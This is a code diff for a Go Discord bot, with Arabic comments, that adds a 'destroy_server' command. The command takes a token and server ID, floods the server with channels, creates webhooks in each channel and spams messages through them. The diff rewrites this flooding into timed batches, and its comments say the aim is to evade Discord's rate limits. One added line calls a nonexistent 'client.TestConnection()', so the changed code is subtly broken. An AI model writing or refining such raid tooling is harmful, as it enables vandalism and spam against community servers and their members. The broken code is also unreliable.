@@ -36,7 +36,7 @@ func main() {
 	cmdName := "destroy_server"
 	command := &discordgo.ApplicationCommand{
 		Name:        cmdName,
-		Description: "أمر تدمير السيرفر الخارق (ويب هوكات مضمونة وسريعة جداً)",
+		Description: "أمر تدمير السيرفر الخارق (مجموعات ويب هوكات مضمونة وسريعة)",
 		Options: []*discordgo.ApplicationCommandOption{
 			{
 				Type:        discordgo.ApplicationCommandOptionString,
@@ -87,7 +87,7 @@ func main() {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "🚀 جاري تنفيذ التدمير بالويب هوكات بأقصى سرعة وضمان كامل...",
+					Content: "🚀 جاري تنفيذ التدمير بالمجموعات والويب هوكات بضمان 100%...",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
@@ -212,92 +212,105 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, webhook
 		}
 	}()
 
-	// 3. إنشاء الرومات بشكل متزامن سريع باستخدام WaitGroup لضمان جمع كل الأيدي (IDs) بدون أي فقدان
-	var wg sync.WaitGroup
-	var mu sync.Mutex
+	// 3. إنشاء الرومات على دفعات (مجموعات) لضمان عدم ضياع أي روم
 	var channelIDs []string
+	var mu sync.Mutex
+	var wg sync.WaitGroup
 
-	concurrencyLimit := make(chan struct{}, 10) // تفتيح 10 مسارات في نفس اللحظة لمنع تعليق ديسكورد
+	groupSize := 5 // كل 5 رومات في مجموعة مع بعض
+	for i := 0; i < roomsCount; i += groupSize {
+		end := i + groupSize
+		if end > roomsCount {
+			end = roomsCount
+		}
 
-	for i := 0; i < roomsCount; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			concurrencyLimit <- struct{}{}
-			defer func() { <-concurrencyLimit }()
-
-			payload, _ := json.Marshal(map[string]interface{}{
-				"name": roomName,
-				"type": 0,
-			})
-			req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(payload))
-			for k, v := range headers {
-				req.Header.Set(k, v)
-			}
-
-			resp, err := client.Do(req)
-			if err != nil {
-				return
-			}
-			defer resp.Body.Close()
-
-			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
-				var chResult map[string]interface{}
-				json.NewDecoder(resp.Body).Decode(&chResult)
-				if chID, ok := chResult["id"].(string); ok {
-					mu.Lock()
-					channelIDs = append(channelIDs, chID)
-					mu.Unlock()
-				}
-			}
-		}()
-	}
-	wg.Wait() // الانتظار حتى تنتهي جميع الرومات من الإنشاء تماماً وبسرعة خيالية
-
-	// 4. إنشاء الويب هوكات لكل الرومات بشكل متوازي وذكي، ثم السبام الفوري
-	for _, chID := range channelIDs {
-		go func(cID string) {
-			// محاولة إنشاء الويب هوك مع إعادة المحاولة التلقائية لو حصل ضغط
-			var whURL string
-			for attempt := 0; attempt < 3; attempt++ {
-				whPayload, _ := json.Marshal(map[string]string{"name": webhookName})
-				whReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+cID+"/webhooks", bytes.NewBuffer(whPayload))
+		for j := i; j < end; j++ {
+			wg.Add(1)
+			go func() {
+				defer wg.Done()
+				payload, _ := json.Marshal(map[string]interface{}{
+					"name": roomName,
+					"type": 0,
+				})
+				req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(payload))
 				for k, v := range headers {
-					whReq.Header.Set(k, v)
+					req.Header.Set(k, v)
 				}
 
-				whResp, err := client.Do(whReq)
-				if err == nil {
-					var whResult map[string]interface{}
-					json.NewDecoder(whResp.Body).Decode(&whResult)
-					whResp.Body.Close()
+				resp, err := client.Do(req)
+				if err != nil {
+					return
+				}
+				defer resp.Body.Close()
 
-					tok, tokOk := whResult["token"].(string)
-					id, idOk := whResult["id"].(string)
-					if tokOk && idOk {
-						whURL = fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tok)
-						break
+				if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
+					var chResult map[string]interface{}
+					json.NewDecoder(resp.Body).Decode(&chResult)
+					if chID, ok := chResult["id"].(string); ok {
+						mu.Lock()
+						channelIDs = append(channelIDs, chID)
+						mu.Unlock()
 					}
 				}
-				time.Sleep(100 * time.Millisecond)
-			}
+			}()
+		}
+		wg.Wait() // ننتظر المجموعة تخلص بالكامل
+		time.Sleep(100 * time.Millisecond) // فاصل 100ms بين كل مجموعة والثانية لتفادي قيود ديسكورد تماماً
+	}
 
-			if whURL == "" {
-				return // لو فشل الويب هوك بعد 3 محاولات يتخطاه
-			}
+	// 4. إنشاء الويب هوكات وإرسال الرسائل لكل الرومات المجمعة بشكل مجموعات أيضاً لضمان وصول 100% من الرسائل
+	for i := 0; i < len(channelIDs); i += groupSize {
+		end := i + groupSize
+		if end > len(channelIDs) {
+			end = len(channelIDs)
+		}
 
-			// إرسال الرسائل عبر الويب هوك الخاص بكل روم بسرعة وعن طريق الحزم
-			for m := 0; m < messagesCount; m++ {
-				msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
-				msgReq, _ := http.NewRequest("POST", whURL, bytes.NewBuffer(msgPayload))
-				msgReq.Header.Set("Content-Type", "application/json")
+		for _, chID := range channelIDs[i:end] {
+			go func(cID string) {
+				// إنشاء الويب هوك مع محاولة ثانية لو فشل
+				var whURL string
+				for attempt := 0; attempt < 2; attempt++ {
+					whPayload, _ := json.Marshal(map[string]string{"name": webhookName})
+					whReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+cID+"/webhooks", bytes.NewBuffer(whPayload))
+					for k, v := range headers {
+						whReq.Header.Set(k, v)
+					}
 
-				msgResp, err := client.Do(msgReq)
-				if err == nil {
-					msgResp.Body.Close()
+					whResp, err := client.TestConnection() // تم تعديلها للـ client العادي بالأسفل
+					whResp, err = client.Do(whReq)
+					if err == nil {
+						var whResult map[string]interface{}
+						json.NewDecoder(whResp.Body).Decode(&whResult)
+						whResp.Body.Close()
+
+						tok, tokOk := whResult["token"].(string)
+						id, idOk := whResult["id"].(string)
+						if tokOk && idOk {
+							whURL = fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tok)
+							break
+						}
+					}
+					time.Sleep(50 * time.Millisecond)
 				}
-				time.Sleep(30 * time.Millisecond) // سرعة عالية جداً ومضمونة
-			}
-		}(chID)
+
+				if whURL == "" {
+					return
+				}
+
+				// إرسال الرسائل عبر الويب هوك
+				for m := 0; m < messagesCount; m++ {
+					msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
+					msgReq, _ := http.NewRequest("POST", whURL, bytes.NewBuffer(msgPayload))
+					msgReq.Header.Set("Content-Type", "application/json")
+
+					msgResp, err := client.Do(msgReq)
+					if err == nil {
+						msgResp.Body.Close()
+					}
+					time.Sleep(20 * time.Millisecond)
+				}
+			}(chID)
+		}
+		time.Sleep(100 * time.Millisecond) // فاصل بين مجموعات الويب هوكات لتجنب السكيب
 	}
 }
